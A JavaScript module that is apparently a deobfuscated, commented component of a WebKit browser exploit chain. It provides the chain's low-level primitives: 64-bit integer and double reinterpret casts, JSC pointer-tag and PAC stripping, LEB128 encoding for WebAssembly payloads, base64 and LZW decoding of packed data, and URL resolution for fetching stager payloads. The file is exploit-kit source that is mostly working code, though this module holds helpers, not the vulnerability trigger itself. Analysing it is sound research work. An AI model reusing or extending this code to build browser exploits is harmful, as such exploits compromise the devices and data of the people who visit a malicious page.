/**
 * Utility / Type Conversion Module
 * Module ID: 57620206d62079baad0e57e6d9ec93120c0f5247
 *
 * This module provides low-level type conversion utilities used throughout
 * the exploit chain. It handles conversions between JavaScript doubles,
 * 64-bit integers, BigInts, and raw byte representations. These primitives
 * are essential for constructing fake objects and manipulating pointers in
 * the WebKit heap.
 *
 * Key capabilities:
 *   - Int64 class for 64-bit integer arithmetic (add, sub, and, or, xor, shift)
 *   - Conversion between doubles and their raw uint32 lo/hi halves
 *   - BigInt <-> Number <-> Double interconversion
 *   - Pointer tag stripping (JSC tagged pointer support)
 *   - UTF-16 encode/decode and string manipulation
 *   - Base64 decoding, LZW decompression
 *   - LEB128 encode/decode (for WebAssembly payloads)
 *   - URL resolution helpers
 */

let m_57620206d62079baad0e57e6d9ec93120c0f5247 = () => {
  let r = {};

  // ──────────────────────────────────────────────
  // BigInt polyfill wrapper
  // ──────────────────────────────────────────────

  /**
   * Convert a value to BigInt if the runtime supports it; otherwise return as-is.
   */
  function i(t) {
    return window.BigInt ? BigInt(t) : t;
  }
  r.U = i;

  // ──────────────────────────────────────────────
  // Core constants
  // ──────────────────────────────────────────────

  // Note: this is more like PAC, not pointer tag
  /** Mask to strip the pointer tag from a JSC tagged pointer (low 39 bits). */
  const u = i(0x7FFFFFFFFF); // 0x7FFFFFFFFF

  /** Maximum safe value for the high 32 bits of a safe integer. */
  const o = 127; // 896953977 ^ 896953862

  /** Number of bits to shift to reach the pointer tag in a 64-bit JSC value. */
  const s = i(39);

  r.B = s;
  r.I = u;
  r.v = o;

  // ──────────────────────────────────────────────
  // Hex formatting
  // ──────────────────────────────────────────────

  /**
   * Convert a value to a hexadecimal string. Returns the string "null" for null.
   */
  r.N = function toHexString(t) {
    return null === t ? "null" : t.toString(16);
  };

  // ──────────────────────────────────────────────
  // GC root tracking
  // ──────────────────────────────────────────────

  /** Array of values to prevent garbage collection. */
  const gcRoots = [];

  /**
   * Push a value into the GC roots array to prevent it from being collected.
   */
  r.D = function pushGCRoot(t) {
    gcRoots.push(t);
  };

  // ──────────────────────────────────────────────
  // Shared typed-array views (for reinterpret casts)
  // ──────────────────────────────────────────────

  const u32View = new Uint32Array(new ArrayBuffer(8)),
    u8View = new Uint8Array(u32View.buffer),
    u16View = new Uint16Array(u32View.buffer),
    f64View = new Float64Array(u32View.buffer);

  // ──────────────────────────────────────────────
  // Primitive conversion helpers
  // ──────────────────────────────────────────────

  /**
   * Combine a low 32-bit and high 32-bit value into a single JS number.
   */
  function l(lo, hi) {
    return lo + 0x100000000 * hi;
  }

  /**
   * Get the low 32 bits of a double (reinterpret cast).
   */
  function b(t) {
    return f64View[0] = t, u32View[0];
  }

  /**
   * Get the high 32 bits of a double (reinterpret cast).
   */
  function U(t) {
    return f64View[0] = t, u32View[1];
  }

  /**
   * Pack two uint32 values into a float64 (reinterpret cast).
   */
  function B(t, n) {
    return u32View[0] = t, u32View[1] = n, f64View[0];
  }

  /**
   * Truncate a value to an unsigned 32-bit integer.
   */
  r.S = function toUint32(t) {
    u32View[0] = t;
    return u32View[0];
  };

  r.T = l;

  /**
   * Reinterpret a double as a number (lo + hi * 2^32).
   */
  r.P = function doubleToNumber(t) {
    f64View[0] = t;
    return l(u32View[0], u32View[1]);
  };

  r.C = b;
  r.V = U;

  /**
   * Extract the high 32 bits of a number by dividing by 2^32.
   */
  r.F = function numberHi32(t) {
    return t / 0x100000000 >>> 0;
  };

  /**
   * Extract the low 32 bits of a number (unsigned right shift by 0).
   */
  r._ = function numberLo32(t) {
    return t >>> 0;
  };
  /**
   * Add a signed 32-bit offset to a double (reinterpret as Int64, add, convert back).
   */
  r.q = function addOffset(t, n) {
    // return Int64.fromDouble(t).addInt32(n).toDouble();
    return Int64.fromDouble(t).H(n).W();
  };

  /**
   * Add a signed 32-bit offset to a double (alias of addOffset).
   */
  r.G = function (t, n) {
    // return Int64.fromDouble(t).addInt32(n).toDouble();
    return Int64.fromDouble(t).H(n).W();
  };

  /**
   * Convert a JS number to a float64 by writing lo/hi into the typed-array view.
   */
  r.J = function toDouble(t) {
    u32View[1] = t / 0x100000000;
    u32View[0] = t;
    return f64View[0];
  };

  /**
   * Convert a BigInt to a JS number.
   */
  r.K = function bigintToNumber(t) {
    return l(
      Number(t & BigInt(0xFFFFFFFF)),
      Number(t >> BigInt(32))
    );
  };

  /**
   * Convert a JS number to a BigInt.
   */
  r.O = function numberi(t) {
    const lo = BigInt(t >>> 0);
    return BigInt(t / 0x100000000 >>> 0) << BigInt(32) | lo;
  };

  /**
   * Convert a double to a BigInt by reinterpreting its raw bytes.
   */
  r.X = function doublei(t) {
    f64View[0] = t;
    const lo = BigInt(u32View[0]);
    const hi = BigInt(u32View[1]);
    return BigInt(hi) << BigInt(32) | lo;
  };

  r.Y = B;

  /**
   * Pack four bytes (big-endian order) into a single uint32.
   */
  r.Z = function packBytes(b3, b2, b1, b0) {
    u8View[0] = b0;
    u8View[1] = b1;
    u8View[2] = b2;
    u8View[3] = b3;
    return u32View[0];
  };

  /**
   * Convert a number to 4 UTF-16 characters (for encoding 64-bit values as strings).
   */
  r.tt = function toCharCodes(t) {
    u32View[1] = t / 0x100000000;
    u32View[0] = t;
    return String.fromCharCode(u16View[0], u16View[1], u16View[2], u16View[3]);
  };

  /**
   * Decode a base64 string into an ArrayBuffer.
   */
  r.nt = function base64ToArrayBuffer(t) {
    var n;
    const decoded = atob(t);
    const bytes = new Uint8Array(decoded.length);
    for (n = 0; n < decoded.length; n++) {
      bytes[n] = decoded.charCodeAt(n);
    }
    return bytes.buffer;
  };

  /**
   * Convert a raw string (each char = one byte) into an ArrayBuffer.
   */
  r.rt = function stringToArrayBuffer(t) {
    var n;
    const bytes = new Uint8Array(t.length);
    for (n = 0; n < t.length; n++) {
      bytes[n] = t.charCodeAt(n);
    }
    return bytes.buffer;
  };

  // ──────────────────────────────────────────────
  // Int64: 64-bit integer arithmetic class
  // ──────────────────────────────────────────────

  /**
   * A 64-bit integer represented as two unsigned 32-bit halves (lo, hi).
   * Provides basic arithmetic, bitwise operations, pointer-tag manipulation,
   * and conversion to/from doubles, BigInts, and JS numbers.
   */
  class Int64 {
    // Wrapper for compatibility with obfuscated modules
    static ut(t) {
      return Int64.fromNumber(t);
    }
    static ot(t) {return Int64.fromBigInt(t);}
    static st(t) {return Int64.fromUnsigned(t);}
    static L(t) {return Int64.fromDouble(t);}
    static ht(t) {return Int64.fromInt32(t);}
    ct() {return this.toNumber();}
    // ft, wt
    gt() {return this.not();}

    constructor(lo, hi) {
      this.it = lo >>> 0, this.et = hi >>> 0;
    }

    /** Create an Int64 from a JS number (up to 2^53). */
    static fromNumber(t) {
      return new Int64(t >>> 0, t / 0x100000000 >>> 0);
    }

    /** Create an Int64 from a BigInt. */
    static fromBigInt(t) {
      return new Int64(Number(t & BigInt(0x100000000 + (1599169875 ^ -1599169876))), Number(t >> BigInt(32)));
    }

    /** Create an Int64 from an unsigned JS number. */
    static fromUnsigned(t) {
      return new Int64(t >>> 0, t / 0x100000000 >>> 0);
    }

    /** Create an Int64 by reinterpreting a float64's raw bits. */
    static fromDouble(t) {
      return new Int64(b(t), U(t));
    }

    /** Create an Int64 from a signed 32-bit integer (sign-extends to 64 bits). */
    static fromInt32(t) {
      return new Int64(t >>> 0, (t < 0 ? -1 : 0) >>> 0);
    }

    /** Convert to a JS number (lo + hi * 2^32). May lose precision above 2^53. */
    toNumber() {
      return 0x100000000 * this.et + this.it;
    }

    /** Returns true if the sign bit (bit 63) is set. */
    ft() {
      return this.et > 127;
    }

    /** Check equality with a JS number. */
    wt(t) {
      const n = t / 0x100000000 >>> 0,
        r = t >>> 0;
      return this.et === n && this.it === r;
    }

    /** Bitwise NOT (~). */
    not() {
      return new Int64(~this.it, ~this.et);
    }

    /** 64-bit addition. */
    add(t) {
      const n = this.it + t.it;
      var r = this.et + t.et;
      return n !== n >>> 0 && r++, new Int64(n >>> 0, r >>> 0);
    }

    /** Add a signed 32-bit integer. */
    H(t) {
      return this.add(Int64.fromInt32(t));
    }

    /** Check equality with another Int64. */
    lt(t) {
      return this.it === t.it && this.et === t.et;
    }

    /** Check inequality with another Int64. */
    bt(t) {
      return this.it !== t.it || this.et !== t.et;
    }

    /** 64-bit subtraction. */
    sub(t) {
      return this.add(t.Ut());
    }

    /** Subtract a signed 32-bit integer. */
    Bt(t) {
      return this.add(Int64.fromInt32(t).Ut());
    }

    /** Bitwise AND. */
    It(t) {
      const n = this.it & t.it,
        r = this.et & t.et;
      return new Int64(n >>> 0, r >>> 0);
    }

    /** Bitwise OR. */
    At(t) {
      const n = this.it | t.it,
        r = this.et | t.et;
      return new Int64(n >>> 0, r >>> 0);
    }

    /** Bitwise XOR. */
    vt(t) {
      const n = this.it ^ t.it,
        r = this.et ^ t.et;
      return new Int64(n >>> 0, r >>> 0);
    }

    /** Two's complement negation. */
    Ut() {
      return this.gt().add(new Int64(1, 0));
    }

    /** Logical right shift by t bits (t must be < 32). */
    dt(t) {
      if (t >= 32) throw new Error("t >= 32");
      return new Int64(this.it >>> t | this.et << 32 - t, this.et >>> t);
    }

    /** Logical right shift (alias for dt). */
    rshift(t) {
      return this.dt(t);
    }

    toString() {
      return "";
    }

    /**
     * Convert to a safe JS number. Throws if the value exceeds
     * o (i.e., the high 32 bits are > 127).
     */
    yt() {
      if (this.et > o) throw new Error("this.et > o");
      return 0x100000000 * this.et + this.it;
    }

    /** Convert to a BigInt. */
    Nt() {
      return BigInt(this.et) * BigInt(0x100000000) + BigInt(this.it);
    }

    /** Strip the pointer tag (mask high 32 bits with o = 0x7F). */
    Dt() {
      return new Int64(this.it, this.et & o);
    }

    /** Return the tagged number (strip tag, then convert to number). */
    St() {
      return 0x100000000 * (this.et & o) + this.it;
    }

    /** Alias for stripTag() - returns a new Int64 with the tag stripped. */
    Tt() {
      return new Int64(this.it, this.et & o);
    }

    /** Reinterpret this Int64 as a float64 (pack lo and hi). */
    W() {
      return B(this.it, this.et);
    }

    /** Returns true if both halves are zero. */
    Et() {
      return 0 === this.it && 0 === this.et;
    }

    /** Get the low 32-bit half. */
    Pt() {
      return this.it;
    }

    /**
     * Convert to a pointer value. Adds 0xFFF (4095) to lo, propagating
     * carry, then masks with 0xFFFFF000 to page-align.
     * Throws if hi > o.
     */
    toPointerValue() {
      if (this.et > o) throw new Error("this.et > o");
      var t = this.it + 0xFFF,
        n = this.et;
      return t !== t >>> 0 && n++, 0x100000000 * (n >>> 0) + ((t &= 0xFFFFF000) >>> 0);
    }
  };const m = Int64;

  // ──────────────────────────────────────────────
  // String encoding / decoding helpers
  // ──────────────────────────────────────────────

  /**
   * Expand each character of a string into two bytes (UTF-16 LE byte pairs).
   * Each character code is split into (code & 0xFF) and (code >> 8).
   */
  function utf16Encode(t) {
    const result = [];
    var n;
    for (n = 0; n < t.length; n++) {
      const code = t.charCodeAt(n);
      result.push(255 & code); // low byte
      result.push(code >>> 8); // high byte
    }
    return String.fromCharCode.apply(null, result);
  }

  /**
   * Decode a UTF-16 LE byte-pair string back to normal characters.
   * Every two bytes are combined into one character.
   */
  function utf16Decode(t) {
    var lo,hi,i,result = "";
    const len = t.length;
    for (i = 0; i < len; i += 2) {
      lo = t.charCodeAt(i);
      hi = i + 1 < len ? t.charCodeAt(i + 1) : 0;
      result += String.fromCharCode(lo | hi << 8);
    }
    return result;
  }

  /**
   * Decode a raw string: expand via utf16Encode, then truncate at the first NUL.
   */
  function decodeString(t) {
    var n = utf16Encode(t);
    const r = n.indexOf("\0");
    return -1 !== r && (n = n.slice(0, r)), n;
  }

  /**
   * Convert a byte value to a two-character lowercase hex string.
   */
  function byteToHex(t) {
    var n = t.toString(16).toLowerCase();
    return 1 === n.length && (n = "0" + n), n;
  }

  /**
   * Convert a 32-bit integer to a 4-byte unicode escape sequence string.
   * Used to produce raw binary strings from 32-bit values.
   *
   * Layout: the 32-bit value is split into 4 bytes and encoded as two
   * %uHHHH escape pairs.
   */
  function intToUnicodeEscape(t) {
    var result;
    const byte0 = 255 & t; // bits 0-7
    const byte3 = (0xFF000000 & t) >> 24 & 255; // bits 24-31
    const byte2 = (0xFF0000 & t) >> 16 & 255; // bits 16-23
    result = "%u";
    result += byteToHex((0xFF00 & t) >> 8 & 255); // bits 8-15
    result += byteToHex(byte0);
    result += "%u";
    result += byteToHex(byte3);
    result += byteToHex(byte2);
    return unescape(result);
  }

  /**
   * Convert a float64 to a pair of uint32 values [hi, lo] (big-endian order).
   */
  function doubleToUint32Pair(t) {
    const buf = new Uint8Array(16);
    const view = new DataView(buf.buffer, 0, 8);
    const pair = new Array(2);
    view.setFloat64(0, t);
    pair[0] = view.getUint32(0, false); // big-endian hi
    pair[1] = view.getUint32(4, false); // big-endian lo
    return pair;
  }

  /**
   * Resolve a potentially relative URL to an absolute URL.
   * If the string does not start with "http://" or "https://", it is
   * resolved relative to the current page's location.
   */
  function resolveUrl(t) {
    var url = decodeString(t);
    // Test if the URL already has an http(s) scheme
    if (null === RegExp("^https?://").exec(url)) {
      const host = location.host;
      const protocol = location.protocol;
      if ("/" === url.charAt(0)) {
        // Absolute path
        url = protocol + "//" + host + url;
      } else {
        // Relative path
        if ("." === url.charAt(0) && "/" === url.charAt(1)) {
          url = url.substring(2);
        }
        const pathname = location.pathname;
        const lastSlash = pathname.lastIndexOf("/");
        url = protocol + "//" + host + pathname.slice(0, lastSlash + 1) + url;
      }
    }
    window.log("resolveUrl => " + url);
    return url;
  }

  // ──────────────────────────────────────────────
  // Export standalone functions
  // ──────────────────────────────────────────────

  r.Vt = r.Int64 = Int64;
  r.Ft = r.utf16Encode = utf16Encode;
  r._t = r.utf16Decode = utf16Decode;
  r.qt = r.decodeString = decodeString;
  r.xt = r.byteToHex = byteToHex;
  r.Wt = r.intToUnicodeEscape = intToUnicodeEscape;

  /**
   * Read an unsigned 16-bit value from a string at byte offset n.
   * The string is treated as packed 16-bit values: each character holds
   * a 16-bit code unit. n is a byte offset (divided by 2 for char index).
   */
  r.Ht = r.readU16FromString = function readU16FromString(t, n) {
    n /= 2;
    return 0x10000 * t.charCodeAt(n + 1) + t.charCodeAt(n); // 893998450 ^ 893932914 = 65536
  };

  /**
   * Convert two uint32 values to a float64 (via DataView, big-endian).
   * @param {number} lo - low 32 bits (written at offset 4)
   * @param {number} hi - high 32 bits (written at offset 0)
   */
  r.Lt = r.u32PairToDouble = function u32PairToDouble(lo, hi) {
    const view = new DataView(new ArrayBuffer(8), 0, 8);
    view.setUint32(0, hi);
    view.setUint32(4, lo);
    return view.getFloat64(0);
  };

  /**
   * Safely pack two uint32 values into a float64, with NaN-boxing validation.
   * Throws if the resulting high bits indicate a NaN (0xFFF00000 mask).
   */
  r.Mt = function safePackDouble(lo, hi) {
    const f64 = new Float64Array(1);
    const u32 = new Uint32Array(f64.buffer);
    const check = new Uint32Array(1);
    u32[0] = lo >>> 0;
    u32[1] = hi >>> 0;
    check[0] = 0xFFF00000 & u32[1]; // 878211651 ^ -878153149
    if (0xFFF00000 === check[0]) throw new Error(0); // 929592947 ^ -929532301
    return f64[0];
  };

  /**
   * Convert a float64 to a Uint8Array (8 bytes).
   */
  r.Rt = function doubleToBytes(t) {
    const buf = new Uint8Array(16);
    new DataView(buf.buffer, 0, 8).setFloat64(0, t);
    return buf;
  };

  r.jt = r.doubleToUint32Pair = doubleToUint32Pair;


  /**
   * Convert a double to a StagerAddress (from the uint32 pair).
   * Returns null if the pair has fewer than 2 elements.
   */
  r.kt = r.doubleToStagerAddress = function doubleToStagerAddress(t) {
    const pair = doubleToUint32Pair(t);
    let result = null;
    if (pair.length >= 2) {
      result = new StagerAddress(pair[1], pair[0]);
    }
    return result;
  };

  /**
   * Write a uint32 value into a byte array at offset n (little-endian).
   * Returns the new offset (n + 4).
   */
  r.zt = function writeU32ToArray(arr, n, value) {
    const v = value >>> 0;
    arr[n] = 255 & v; // byte 0
    arr[n + 1] = v >> 8 & 255; // byte 1
    arr[n + 2] = v >> 16 & 255; // byte 2
    arr[n + 3] = v >> 24 & 255; // byte 3
    return n + 4;
  };

  /**
   * Read a uint32 from a byte array at offset n (little-endian).
   */
  r.Gt = function readU32FromArray(arr, n) {
    return (arr[n] | arr[n + 1] << 8 | arr[n + 2] << 16 | arr[n + 3] << 24) >>> 0;
  };

  /**
   * Decode a base64 string to a UTF-16 string.
   * The base64-decoded bytes are treated as UTF-16 LE pairs.
   */
  r.Jt = r.base64DecodeUtf16 = function base64DecodeUtf16(t) {
    var n,code,i,result = "";
    const decoded = globalThis.atob(t);
    const len = decoded.length;
    // Pad with a NUL 4-byte unicode escape to ensure even length
    n = decoded + intToUnicodeEscape(0);
    for (i = 0; i < len; i += 2) {
      code = n.charCodeAt(i);
      code |= n.charCodeAt(i + 1) << 8;
      code >>>= 0;
      result += String.fromCharCode(code);
    }
    return result;
  };

  /**
   * LZW decompression.
   * Decompresses a string that was compressed with LZW encoding.
   * Handles the surrogate gap: when the dictionary index reaches 0xD800 (55296),
   * it jumps to 0xE000 (57344) to avoid the Unicode surrogate range.
   */
  r.Kt = r.lzwDecompress = function lzwDecompress(t) {
    const dict = new Map();
    var prev,entry,code,nextCode,
      result = "",
      dictSize = 256; // 1967607135 ^ 1967606879

    // Initialize dictionary with single-byte entries (0..255)
    for (prev = 0; prev < 256; prev += 1) {// 1984197735 ^ 1984197991
      dict.set(prev, String.fromCodePoint(prev));
    }

    [...t].forEach(function (ch, idx) {
      if (0 === idx) {
        // First character: output directly
        prev = String.fromCodePoint(ch.codePointAt(0));
        entry = prev;
      } else {
        code = ch.codePointAt(0);
        if (dict.has(code)) {
          nextCode = dict.get(code);
        } else {
          if (code !== dictSize) throw new Error(0);
          nextCode = prev + String.fromCodePoint(prev.codePointAt(0));
        }
        entry += nextCode;
        dict.set(dictSize++, prev + String.fromCodePoint(nextCode.codePointAt(0)));
        // Skip the Unicode surrogate range (0xD800..0xDFFF)
        if (55296 === dictSize) {// 879182932 ^ 879205460 = 0xD800
          dictSize = 57344; // 1886736973 ^ 1886761549 = 0xE000
        }
        prev = nextCode;
      }
    });

    return utf16Decode(entry);
  };

  r.Ot = r.resolveUrl = resolveUrl;

  /**
   * Resolve a URL and pad it with NUL characters to a 4-byte boundary,
   * then decode via utf16Decode.
   */
  r.Qt = r.resolveUrlPadded = function resolveUrlPadded(t) {
    var n = resolveUrl(t);
    for (n += "\0"; n.length % 4 != 0;) n += "\0";
    return utf16Decode(n);
  };

  /**
   * Encode a 64-bit Int64 value as unsigned LEB128 into a byte array.
   * @param {Array} arr - destination byte array
   * @param {number} n - starting offset
   * @param {Int64} value - the value to encode
   */
  r.Xt = r.encodeLEB128 = function encodeLEB128(arr, n, value) {
    var byte;
    for (;;) {
      byte = value.it % 128; // 1466329413 ^ 1466329541
      value = value.sub(Int64.fromInt32(byte));
      if (0 === value.et && 0 === value.it) {

        // Last byte: no continuation bit
      } else {byte |= 128; // 1416853561 ^ 1416853689 (continuation)
      }
      arr[n++] = byte;
      value = value.rshift(7);
      if (!(128 & byte)) break; // 1110466900 ^ 1110467028
    }
  };

  /**
   * Decode an unsigned LEB128 value from a byte array.
   * @param {Array} arr - source byte array
   * @param {number} n - starting offset
   * @returns {{ Zt: number, $t: number }} decoded value and number of bytes consumed
   */
  r.Yt = function decodeLEB128(arr, n) {
    var result = 0,
      shift = 0;
    const startOffset = n;
    do {
      result += (127 & arr[n]) << shift; // 1447114358 ^ 1447114249
      shift += 7;
    } while (128 & arr[n++]); // 1466525748 ^ 1466525876
    return {
      Zt: result,
      $t: n - startOffset
    };
  };

  /**
   * Throw a generic error (used as an unreachable / abort marker).
   */
  r.tn = function throwError() {
    throw new Error("throwError");
  };

  // ──────────────────────────────────────────────
  // Pointer tag helper
  // ──────────────────────────────────────────────

  /**
   * Strip the pointer tag from a BigInt pointer value by masking with u.
   */
  function stripPointerTag(t) {
    //window.log("strip " + t.toString(16));
    return t & u;
  }

  // ──────────────────────────────────────────────
  // TypeHelper class
  // ──────────────────────────────────────────────

  /**
   * Helper class that wraps a DataView for performing type-punning conversions
   * between various numeric types (int16, uint16, uint32, float32, float64,
   * bigint64) via an internal 16-byte buffer.
   */
  r.nn = class TypeHelper {
    constructor() {
      this.buffer = new ArrayBuffer(16), this.view = new DataView(this.buffer);
    }

    /** Convert a value to a signed 16-bit integer. */
    un(t) {
      this.view.setInt16(0, t, true);
      return this.view.getInt16(0, true);
    }

    /** Convert a value to an unsigned 16-bit integer. */
    on(t) {
      this.view.setUint16(0, t, true);
      return this.view.getUint16(0, true);
    }

    /** Convert any value (number or bigint) to uint32. */
    sn(t) {
      if ("bigint" == typeof t) {
        this.view.setBigUint64(0, t, true);
      } else {
        this.view.setUint32(0, t, true);
      }
      return this.view.getUint32(0, true);
    }

    /** Set a double, replace its low 32 bits, read back as double. */
    hn(t, n) {
      this.view.setFloat64(0, t, true);
      this.view.setUint32(0, n, true);
      return this.view.getFloat64(0, true);
    }

    /** Set a double, replace its high 32 bits, read back as double. */
    cn(t, n) {
      this.view.setFloat64(0, t, true);
      this.view.setUint32(4, n, true);
      return this.view.getFloat64(0, true);
    }

    /** Read a BigUint64 from 4 UTF-16 characters (8 bytes). */
    fn(t) {
      for (let n = 0; n < 4; n++) {
        let code = t.charCodeAt(n);
        if (Number.isNaN(code)) throw new Error("Number.isNaN(code)");
        this.view.setUint16(2 * n, code, true);
      }
      return this.view.getBigUint64(0, true);
    }

    /** Convert a float32 to its uint32 bit representation. */
    an(t) {
      this.view.setFloat32(0, t, true);
      return this.view.getUint32(0, true);
    }

    /** Convert a BigInt (uint64) to a float64. */
    wn(t) {
      this.view.setBigUint64(0, t, true);
      return this.view.getFloat64(0, true);
    }

    /** Set a BigUint64, replace byte 0 with n, read back as BigUint64. */
    gn(t, n) {
      this.view.setBigUint64(0, t, true);
      this.view.setUint8(0, Number(n));
      return this.view.getBigUint64(0, true);
    }

    /** Set a BigUint64, replace low uint32 with n, read back as BigUint64. */
    ln(t, n) {
      this.view.setBigUint64(0, t, true);
      this.view.setUint32(0, Number(n), true);
      return this.view.getBigUint64(0, true);
    }

    /** Set a uint32, replace byte 0 with n, read back as uint32. */
    bn(t, n) {
      this.view.setUint32(0, t, true);
      this.view.setUint8(0, Number(n));
      return this.view.getUint32(0, true);
    }

    /** Set a uint32, then overwrite it entirely with n, read back. */
    Un(t, n) {
      this.view.setUint32(0, t, true);
      this.view.setUint32(0, Number(n), true);
      return this.view.getUint32(0, true);
    }

    /** Convert a JS number to a BigUint64 by splitting into lo/hi uint32. */
    Bn(t) {
      this.view.setUint32(0, Number(t >>> 0), true);
      this.view.setUint32(4, Number(t / 0x100000000), true);
      return this.view.getBigUint64(0, true);
    }

    /** Set a BigUint64, replace low uint32, read back as BigUint64. */
    mn(t, n) {
      this.view.setBigUint64(0, t, true);
      this.view.setUint32(0, Number(n), true);
      return this.view.getBigUint64(0, true);
    }

    /** Identity: write a BigUint64 and read it back (normalization). */
    In(t) {
      this.view.setBigUint64(0, t, true);
      return this.view.getBigUint64(0, true);
    }
  };

  r.An = stripPointerTag;

  /**
   * Check whether a value has a pointer tag (i.e., stripping the tag changes it).
   */
  r.vn = function (t) {
    return stripPointerTag(t) !== t;
  };

  return r;
};